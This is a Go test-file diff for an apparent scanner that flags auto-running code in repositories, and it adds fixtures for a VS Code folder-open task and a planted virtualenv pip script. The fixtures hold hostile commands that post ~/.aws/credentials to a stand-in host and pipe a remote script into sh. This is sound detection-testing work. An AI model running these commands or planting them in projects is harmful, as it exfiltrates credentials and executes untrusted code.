@@ -17,6 +17,23 @@ func corpus(t *testing.T, name string) string {
 	return filepath.Join(root, "testdata", "corpus", name)
 }
 
+// filesRepo builds a repo from a map of slash-separated paths to content.
+func filesRepo(files map[string]string) func(t *testing.T) string {
+	return func(t *testing.T) string {
+		dir := t.TempDir()
+		for name, content := range files {
+			p := filepath.Join(dir, filepath.FromSlash(name))
+			if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
+				t.Fatal(err)
+			}
+		}
+		return dir
+	}
+}
+
 // gitConfigRepo builds a repo whose .git/config has the given content. Git
 // cannot commit a nested .git, so the fixture is written at test time.
 func gitConfigRepo(config string) func(t *testing.T) string {
@@ -47,6 +64,8 @@ func TestAutoexec(t *testing.T) {
 		wantCode   int
 		wantAt     map[string]string // rule to "path:line" that must be present
 		wantAbsent []string          // rules that must not appear anywhere
+		// wantIncomplete is set when a file is expected to be skipped, so coverage is not complete
+		wantIncomplete bool
 	}{
 		{
 			name:     "fake interview repo: folder-open task sends the secret away, postinstall runs a script",
@@ -81,6 +100,33 @@ func TestAutoexec(t *testing.T) {
 			setup:    func(t *testing.T) string { return corpus(t, "p2-husky-curl-sh") },
 			wantCode: 20,
 			wantAt:   map[string]string{"GAL-AUTOEXEC-011": ".husky/pre-commit:2"},
+		},
+		{
+			name: "broken tasks file hides folderOpen behind an escape and a comment",
+			setup: filesRepo(map[string]string{
+				".vscode/tasks.json": "{\"tasks\":[{\n\"command\":\"curl -d @$HOME/.aws/credentials https://collect.sinkhole.test/x\"\n\"runOptions\":{\"runOn\" /*x*/ : \"\\u0066olderOpen\"}}]}",
+			}),
+			wantCode:       20,
+			wantAt:         map[string]string{"GAL-AUTOEXEC-001": ".vscode/tasks.json:3", "GAL-AUTOEXEC-010": ".vscode/tasks.json:2"},
+			wantIncomplete: true,
+		},
+		{
+			name: "settings point the interpreter into a virtualenv and a script is committed there",
+			setup: filesRepo(map[string]string{
+				".vscode/settings.json": "{\"python.defaultInterpreterPath\": \"${workspaceFolder}/.venv/bin/python\"}\n",
+				".venv/bin/pip":         "#!/bin/sh\ncurl -fsSL https://get.sinkhole.test/x.sh | sh\n",
+			}),
+			wantCode:   20,
+			wantAt:     map[string]string{"GAL-AUTOEXEC-011": ".venv/bin/pip:2"},
+			wantAbsent: []string{"GAL-AUTOEXEC-002"},
+		},
+		{
+			name: "benign twin: settings point the interpreter into a virtualenv",
+			setup: filesRepo(map[string]string{
+				".vscode/settings.json": "{\"python.defaultInterpreterPath\": \"${workspaceFolder}/.venv/bin/python\"}\n",
+			}),
+			wantCode:   0,
+			wantAbsent: []string{"GAL-AUTOEXEC-002"},
 		},
 		{
 			name: "git config fsmonitor runs a command",
@@ -155,6 +201,9 @@ func TestAutoexec(t *testing.T) {
 						t.Errorf("%s has no path:line evidence: %+v", f.RuleID, f)
 					}
 				}
+			}
+			if tt.wantIncomplete {
+				return
 			}
 			if rep.Coverage.FilesAnalyzed != rep.Coverage.FilesSeen || len(rep.Coverage.Skipped) != 0 {
 				t.Errorf("coverage analyzed/seen/skipped = %d/%d/%v, want all files analyzed", rep.Coverage.FilesAnalyzed, rep.Coverage.FilesSeen, rep.Coverage.Skipped)
